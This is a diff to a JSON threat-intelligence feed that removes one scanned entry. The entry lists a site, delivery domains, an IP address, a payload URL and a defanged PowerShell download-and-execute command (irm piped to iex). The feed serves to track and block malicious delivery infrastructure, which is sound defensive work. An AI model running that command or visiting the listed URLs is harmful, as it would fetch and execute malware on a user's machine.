@@ -3557,30 +3557,5 @@
     ],
     "ReportId": "cmwrpci4a2rj30omlkcmoos2p",
     "ScannedAt": "2026-11-22T10:36:45.188000+00:00"
-  },
-  {
-    "UrlDomain": "rustonrealtors.com",
-    "DeliveryUrl": [
-      "apidevst.com",
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/ben/a95e4549bad4d866"
-    ],
-    "IP": [
-      "67.222.38.91"
-    ],
-    "Related": [
-      {
-        "Value": "https://apidevst.com/uawfhczhoirqgm3sqa8r2hsloaaytlgjqevq-gkczvof",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/ben/a95e4549bad4d866')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/ben/a95e4549bad4d866"
-    ],
-    "ReportId": "cmwro4vsm2qpw0omlz9qmz51u",
-    "ScannedAt": "2026-11-22T10:02:50.046000+00:00"
   }
 ]
